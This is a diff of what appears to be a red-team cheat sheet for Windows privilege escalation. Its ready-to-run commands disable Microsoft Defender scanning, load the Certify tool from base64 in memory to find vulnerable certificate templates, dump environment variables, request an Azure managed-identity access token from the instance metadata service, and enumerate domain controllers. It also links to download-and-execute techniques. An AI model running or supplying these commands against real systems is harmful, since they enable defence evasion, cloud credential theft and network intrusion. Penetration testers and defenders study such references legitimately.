@@ -1,5 +1,7 @@
 #https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
 
+# Extract the env variables
+set
 
 #check permissions of file
 icacls C:\Users\myuser\poc.exe
@@ -70,6 +72,9 @@ PS C:\> Set-MpPreference -DisableIOAVProtection $true
 PS C:\> Set-MpPreference -DisableScriptScanning 1
 
 
+#Download and execute
+# https://swisskyrepo.github.io/InternalAllTheThings/redteam/access/windows-download-execute/
+
 #Egress
 
 
@@ -126,3 +131,10 @@ $res.Properties
 $CertifyAssembly = [System.Reflection.Assembly]::Load([Convert]::FromBase64String("aa..."))
 #Jump on the Module's entrypoint and provide arguments ("".Split() is necessary):
 [Certify.Program]::Main("find /vulnerable".Split())
+
+
+# Azure Cloud
+powershell -c Invoke-WebRequest -Uri "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" -Method GET -Headers @{Metadata="true"} -UseBasicParsing
+
+# Obtain domain information
+nltest /dsgetdc:
